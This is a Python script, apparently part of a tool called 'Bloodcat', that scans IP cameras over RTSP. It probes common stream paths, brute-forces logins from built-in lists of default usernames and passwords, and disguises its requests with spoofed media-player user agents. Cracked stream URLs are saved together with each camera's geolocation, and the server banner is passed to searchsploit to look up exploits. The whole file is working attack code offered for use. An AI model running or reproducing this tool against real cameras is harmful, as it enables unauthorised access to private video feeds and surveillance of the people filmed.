#!/usr/bin/python3
# @Мартин.
# ███████╗              ██╗  ██╗    ██╗  ██╗     ██████╗    ██╗  ██╗     ██╗    ██████╗
# ██╔════╝              ██║  ██║    ██║  ██║    ██╔════╝    ██║ ██╔╝    ███║    ╚════██╗
# ███████╗    █████╗    ███████║    ███████║    ██║         █████╔╝     ╚██║     █████╔╝
# ╚════██║    ╚════╝    ██╔══██║    ╚════██║    ██║         ██╔═██╗      ██║     ╚═══██╗
# ███████║              ██║  ██║         ██║    ╚██████╗    ██║  ██╗     ██║    ██████╔╝
# ╚══════╝              ╚═╝  ╚═╝         ╚═╝     ╚═════╝    ╚═╝  ╚═╝     ╚═╝    ╚═════╝
import re
import sys
import time
import random
import socket
import base64
import subprocess
from lib.log_cat import LogCat
from lib.location import Location 
# from lib.calc_io import calcIO 
log = LogCat()


class CamLib():
    def __init__(self):
        self.TIMEOUT=5
        self.default_user = "bloodcat"
        self.default_password = "S_H4CK13"
        self.FILE = './data/ipcam.info'
        self.USER = [
            "admin",
            "administrator",
            "Administrator",
            "ADMINISTRATOR",
            "root",
            "service",
            "Dinion",
            "supervisor",
            "default",
            "888888",
            "666666",
            "Admin",
            "Admin1",
            "admin1",
            "ubnt",
            "system",
            "camera"
        ]
        self.USER_AGENTS = [
            "VLC/3.0.18 LibVLC/3.0.18",
            "VLC/3.0.17 LibVLC/3.0.17",
            "VLC/3.0.16 LibVLC/3.0.16",
            "VLC/3.0.15 LibVLC/3.0.15",
            "VLC/3.0.14 LibVLC/3.0.14",
            "VLC/3.0.13 LibVLC/3.0.13",
            "VLC/3.0.12 LibVLC/3.0.12",
            "VLC/3.0.11 LibVLC/3.0.11",
            "VLC/3.0.10 LibVLC/3.0.10",
            "VLC/3.0.9 LibVLC/3.0.9",
            "VLC/3.0.8 LibVLC/3.0.8",
            "VLC/3.0.7 LibVLC/3.0.7",
            "VLC/3.0.6 LibVLC/3.0.6",
            "VLC/3.0.5 LibVLC/3.0.5",
            "VLC/3.0.4 LibVLC/3.0.4",
            "VLC/3.0.3 LibVLC/3.0.3",
            "VLC/3.0.2 LibVLC/3.0.2",
            "VLC/3.0.1 LibVLC/3.0.1",
            "VLC/3.0.0 LibVLC/3.0.0",
            "VLC/2.2.8 LibVLC/2.2.8",
            "VLC/2.2.7 LibVLC/2.2.7",
            "VLC/2.2.6 LibVLC/2.2.6",
            "VLC/2.2.5 LibVLC/2.2.5",
            "VLC/2.2.4 LibVLC/2.2.4",
            "VLC/2.2.3 LibVLC/2.2.3",
            "VLC/2.2.2 LibVLC/2.2.2",
            "VLC/2.2.1 LibVLC/2.2.1",
            "VLC/2.2.0 LibVLC/2.2.0",
            "VLC/2.1.6 LibVLC/2.1.6",
            "VLC/2.1.5 LibVLC/2.1.5",
            "VLC/2.1.4 LibVLC/2.1.4",
            "VLC/2.1.3 LibVLC/2.1.3",
            "VLC/2.1.2 LibVLC/2.1.2",
            "VLC/2.1.1 LibVLC/2.1.1",
            "VLC/2.1.0 LibVLC/2.1.0",
            "VLC/2.0.9 LibVLC/2.0.9",
            "VLC/2.0.8 LibVLC/2.0.8",
            "VLC/2.0.7 LibVLC/2.0.7",
            "VLC/2.0.6 LibVLC/2.0.6",
            "VLC/2.0.5 LibVLC/2.0.5",
            "VLC/2.0.4 LibVLC/2.0.4",
            "VLC/2.0.3 LibVLC/2.0.3",
            "VLC/2.0.2 LibVLC/2.0.2",
            "VLC/2.0.1 LibVLC/2.0.1",
            "VLC/2.0.0 LibVLC/2.0.0",
            "VLC/1.1.13 LibVLC/1.1.13",
            "VLC/1.1.12 LibVLC/1.1.12",
            "VLC/1.1.11 LibVLC/1.1.11",
            "VLC/1.1.10 LibVLC/1.1.10",
            "VLC/1.1.9 LibVLC/1.1.9",
            "VLC/1.1.8 LibVLC/1.1.8",
            "VLC/1.1.7 LibVLC/1.1.7",
            "VLC/1.1.6 LibVLC/1.1.6",
            "VLC/1.1.5 LibVLC/1.1.5",
            "VLC/1.1.4 LibVLC/1.1.4",
            "VLC/1.1.3 LibVLC/1.1.3",
            "VLC/1.1.2 LibVLC/1.1.2",
            "VLC/1.1.1 LibVLC/1.1.1",
            "VLC/1.1.0 LibVLC/1.1.0",
            "VLC/1.0.6 LibVLC/1.0.6",
            "VLC/1.0.5 LibVLC/1.0.5",
            "VLC/1.0.4 LibVLC/1.0.4",
            "VLC/1.0.3 LibVLC/1.0.3",
            "VLC/1.0.2 LibVLC/1.0.2",
            "VLC/1.0.1 LibVLC/1.0.1",
            "VLC/1.0.0 LibVLC/1.0.0",
            "Lavf/59.27.100",
            "Lavf/59.26.100",
            "Lavf/59.25.100",
            "Lavf/59.24.100",
            "Lavf/59.23.100",
            "Lavf/59.22.100",
            "Lavf/59.21.100",
            "Lavf/59.20.100",
            "Lavf/59.19.100",
            "Lavf/59.18.100",
            "Lavf/59.17.100",
            "Lavf/59.16.100",
            "Lavf/59.15.100",
            "Lavf/59.14.100",
            "Lavf/59.13.100",
            "Lavf/59.12.100",
            "Lavf/59.11.100",
            "Lavf/59.10.100",
            "Lavf/59.9.100",
            "Lavf/59.8.100",
            "Lavf/59.7.100",
            "Lavf/59.6.100",
            "Lavf/59.5.100",
            "Lavf/59.4.100",
            "Lavf/59.3.100",
            "Lavf/59.2.100",
            "Lavf/59.1.100",
            "Lavf/59.0.100",
            "Lavf/58.76.100",
            "Lavf/58.75.100",
            "Lavf/58.74.100",
            "Lavf/58.73.100",
            "Lavf/58.72.100",
            "Lavf/58.71.100",
            "Lavf/58.70.100",
            "Lavf/58.69.100",
            "Lavf/58.68.100",
            "Lavf/58.67.100",
            "Lavf/58.66.100",
            "Lavf/58.65.100",
            "Lavf/58.64.100",
            "Lavf/58.63.100",
            "Lavf/58.62.100",
            "Lavf/58.61.100",
            "Lavf/58.60.100",
            "Lavf/58.59.100",
            "Lavf/58.58.100",
            "Lavf/58.57.100",
            "Lavf/58.56.100",
            "Lavf/58.55.100",
            "Lavf/58.54.100",
            "Lavf/58.53.100",
            "Lavf/58.52.100",
            "Lavf/58.51.100",
            "Lavf/58.50.100",
            "MPV/0.35.1",
            "MPV/0.35.0",
            "MPV/0.34.1",
            "MPV/0.34.0",
            "MPV/0.33.1",
            "MPV/0.33.0",
            "MPV/0.32.0",
            "MPV/0.31.0",
            "MPV/0.30.0",
            "MPV/0.29.1",
            "MPV/0.29.0",
            "MPV/0.28.2",
            "MPV/0.28.1",
            "MPV/0.28.0",
            "MPV/0.27.2",
            "MPV/0.27.1",
            "MPV/0.27.0",
            "MPV/0.26.0",
            "MPV/0.25.0",
            "MPV/0.24.0",
            "MPV/0.23.0",
            "MPV/0.22.1",
            "MPV/0.22.0",
            "MPV/0.21.0",
            "MPV/0.20.0",
            "MPV/0.19.0",
            "MPV/0.18.1",
            "MPV/0.18.0",
            "MPV/0.17.0",
            "MPV/0.16.0",
            "MPV/0.15.0",
            "MPV/0.14.0",
            "MPV/0.13.0",
            "MPV/0.12.0",
            "MPV/0.11.0",
            "MPV/0.10.0",
            "MPV/0.9.0",
            "MPV/0.8.0",
            "MPV/0.7.0",
            "MPV/0.6.0",
            "MPV/0.5.0",
            "MPV/0.4.0",
            "MPV/0.3.0",
            "MPV/0.2.0",
            "MPV/0.1.0",
        ]
        self.PATH = [
            "/Streaming/Channels/101",
            "/Streaming/Channels/102",
            "/Streaming/Channels/1",
            "/Streaming/Channels/1601",
            "/cam/realmonitor?channel=1&subtype=0",
            "/cam/realmonitor?channel=1&subtype=1",
            "/cam/realmonitor",
            "/cam/realmonitor?channel=1&subtype=0&unicast=true&proto=onvif",
            "/axis-media/media.amp",
            "/axis-cgi/mjpg/video.cgi",
            "/axis-cgi/media.cgi",
            "/SNC/media/media.amp",
            "/live.sdp",
            "/stream1",
            "/stream2",
            "/live",
            "/0",
            "/1",
            "/11",
            "/12",
            "/videoMain",
            "/videoSub",
            "/h264",
            "/h265",
            "/ch0_0.h264",
            "/ch1_0.h264",
            "/live/ch00_0",
            "/live/ch0",
            "/live/channel1",
            "/live/channel0",
            "/ipcam.sdp",
            "/cam1/h264",
            "/video-stream",
            "/h264_stream",
            "/live_mpeg4.sdp",
            "/media/video1",
            "/media/video2",
            "/unicast/c1/s0/live",
            "/unicast/c2/s1/live",
            "/ucast/1/1",
            "/live/video/profile1",
            "/live/video/profile2",
            "/live/h264",
            "/live/mpeg4",
            "/live/h264_ulaw/VGA",
            "/live/h264_ulaw/HD720P",
            "/live/h264/HD1080",
            "/live/h264/HD1080P",
            "/mpeg4/media.amp?resolution=640x480"
        ]
        self.PASSWORD = [
            '',
            '000000', '00000000',
            '1111', '111111', '11111111', '1111111111',
            '112233', '11223344',
            '121212',
            '1234', '12345', '123456', '1234567', '12345678',
            '123456789', '1234567890', '12345678910', '123456789012',
            '123123', '123123123',
            '12341234', '12344321', '1234512345',
            '987654321', '9876543210',
            '4321', '9999',
            '666666', '888888', '88888888',
            'admin', 'Admin123', 'ADMIN123',
            'admin123', 'admin123456', 'admin123456789',
            'admin000', 'admin888',
            'admin123!', 'admin@123', 'admin#123',
            'admin@123456', 'admin123!@#',
            '123456admin',
            'root', 'root123', 'root123456', 'root123456789',
            'roottoor', 'toor',
            'administrator', 'Administrator', 'ADMINISTRATOR',
            'system', 'System', 'SYSTEM',
            'password', 'Password', 'PASSWORD',
            'password123', 'password1234', 'password12345', 'password123456',
            'pass', 'passw0rd', 'Passw0rd',
            'qwerty', 'qwerty123', 'qwerty1234', 'qwerty12345',
            'qwertyui', 'qwertyuiop',
            'asdfgh', 'asdfgh123',
            'zxcvbn', 'zxcvbn123',
            '1qaz2wsx', '1q2w3e4r', '1q2w3e',
            'qwe123', 'qweasd', 'qweasd123',
            '123qweasd',
            'qaz123', 'wsx123', 'edc123',
            'camera', 'Camera', 'CAMERA',
            'security', 'Security', 'SECURITY',
            'surveillance', 'Surveillance',
            'ipcam', 'IPCam', 'IPCAM',
            'dvr', 'DVR',
            'nvr', 'NVR',
            'hik12345',
            'vizxv',
            'meinsm',
            'fliradmin',
            'ikwd',
            'jvc',
            'ubnt',
            'arlo',
            'default',
            'a123456',
            '123456a',
            '12345678a',
            '123456789a',
            '123456789!',
            '123456789abc',
            '123abc!',
            'fang12345',
            'null', 'NULL',
            'none', 'None', 'NONE'
        ]

    def save_info(self, rtsp_url: str, ip_data: str):
        try:
            with open(self.FILE, 'a', encoding='utf-8') as f:
                f.write(rtsp_url + ' # ' + str(ip_data) + '\n')
        except Exception as e:
            log.error("Failed to save results, check permissions or if the file exists...")
        else:
            log.info(f"Results successfully appended to: [\033[33m{self.FILE}\033[0m]")

    def run(self, ip: str, port=554,password=''):
        if password:
            self.PASSWORD = [password]
            log.info(f"Currently entering password spraying : Try Password => [{password}]",f"{password}")
        log.info(f"Current Detection [{ip}:{port}]",f"{ip}:{port}")
        ip_data = self.show_location(ip)
        resp = self.options_no_auth(ip, port)
        code = self.status(resp)
        if code is None:
            log.warning("Partial fingerprint match (50%): no response from target")
        elif code == 200:
            log.info("Full fingerprint match (100%): resource accessible without authentication")
        elif code == 401:
            log.info("Full fingerprint match (100%): authentication required")
        elif code == 403:
            log.info("Full fingerprint match (100%): access explicitly forbidden")
        elif code in (404, 454):
            log.info("Full fingerprint match (100%): URI ignored")
        log.info(f"Probing paths using credentials [{self.default_user}:{self.default_password}]...",f"{self.default_user}:{self.default_password}")
        auth_bloodcat = self.b64(self.default_user, self.default_password)
        paths_with_401 = []
        paths_no_auth = []
        for path in self.PATH:
            resp = self.describe_path(ip, port, path, auth_bloodcat)
            code = self.status(resp)
            if code == 401:
                log.info(f"Path [{path}] exists, proceeding with credential brute-force...",f"{path}")
                paths_with_401.append(path)
                break
            elif code == 200:
                log.info(f"Path [{path}] exists and is accessible without authentication!",f"{path}")
                paths_no_auth.append(path)
                break
            elif code == 404 or code == 400:
                log.info(f"Path [{path}] does not exist",f"{path}")
            else:
                log.warning(f"Target returned an unexpected response: [{code}] , please try again later...",f"{path}")
                return 0
            time.sleep(0.2)
        if paths_no_auth:
            rtsp_url = f"rtsp://{self.default_user}:{self.default_password}@{ip}:{port}{paths_no_auth[0]}"
            log.success(f"RTSP PLAY ：[\033[5m{rtsp_url}]",f"{rtsp_url}")
            self.save_info(rtsp_url,ip_data)
            return 1
        if not paths_with_401:
            paths_with_401 = ["/"]  
        valid_creds = []
        target_path = paths_with_401[0]
        log.info(f"witching to path: [{target_path}], attempting to retrieve credentials...", f"{target_path}")
        for u in self.USER:
            for p in self.PASSWORD:
                auth = self.b64(u, p)
                if target_path:
                    resp = self.describe_path(ip, port, target_path, auth)
                else:
                    resp = self.describe_root(ip, port, auth)
                code = self.status(resp)
                if code in (200, 403):
                    print()
                    log.info(f"Found credentials : [{u}:{p}]",f"{u}:{p}")
                    rtsp_url = f"rtsp://{u}:{p}@{ip}:{port}{path}" if path else f"rtsp://{u}:{p}@{ip}:{port}{target_path}"
                    log.success(f"RTSP PLAY ：[\033[5m{rtsp_url}]",f"{rtsp_url}")
                    self.save_info(rtsp_url,ip_data)
                    return 1
                else:
                    sys.stdout.write(f"\r☕ ➣ Attempting credentials : [{u}:{p}]\x1b[K")
                    sys.stdout.flush()
                time.sleep(0.2)
        else:
            print()
            log.warning("No valid credentials found")

    def show_location(self,ip:str):
        location_ = Location()
        data = location_.get(ip)   
        show = f'''\033[33m==========================================
Country: {data['country']}
City: {data['city']}
Lat&Lng: {data['lalo']}
ASN: {data['asn']}
ISP/Org: {data['sys_org']}
Network Range: {data['network']}
===========================================\033[0m'''
        print(show)
        location_.close()
        return data

    def send(self,req, ip, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.TIMEOUT)
        try:
            s.connect((ip, port))
            s.sendall(req.encode())
            data = s.recv(8192)
            return data.decode(errors="ignore")
        except Exception:
            return None
        finally:
            s.close()

    def describe_path(self,ip, port, path, auth=None):
        hdr = ""
        if auth:
            hdr = f"Authorization: Basic {auth}\r\n"
        ua = self.random_ua()
        req = (
            f"DESCRIBE rtsp://{ip}:{port}{path} RTSP/1.0\r\n"
            f"CSeq: 3\r\n"
            f"Accept: application/sdp\r\n"
            f"User-Agent: {ua}\r\n"
            f"{hdr}\r\n"
        )

        return self.send(req, ip, port)

    def random_ua(self):
        return random.choice(self.USER_AGENTS)

    def status(self,resp):
        if not resp:
            return None
        try:
            return int(resp.splitlines()[0].split()[1])
        except Exception:
            return None

    def b64(self,user, pwd):
        return base64.b64encode(f"{user}:{pwd}".encode()).decode()
    
    def options_no_auth(self, ip, port):
        ua = self.random_ua()
        req = (
            f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\n"
            f"CSeq: 1\r\n"
            f"User-Agent: {ua}\r\n\r\n"
        )

        data = self.send(req, ip, port)
        if not isinstance(data, str):
            log.warning("No response received, please try again later...")
            return data 
        m = re.search(r'(?im)^Server:\s*([^\r\n]+)', data)
        if m:
            log.info(f"Service detected: [{m.group(1)}]",f"{m.group(1)}")
            try:
                subprocess.run(
                    ["./exploitdb/searchsploit", "-w", m.group(1)],
                    check=True
                )
            except Exception:
                log.warning(
                    "CVE lookup failed. Please run on Linux with Bloodcat installed. "
                    "Try `chmod +x ./exploitdb/searchsploit`.",
                    "chmod +x ./exploitdb/searchsploit"
                )
        return data
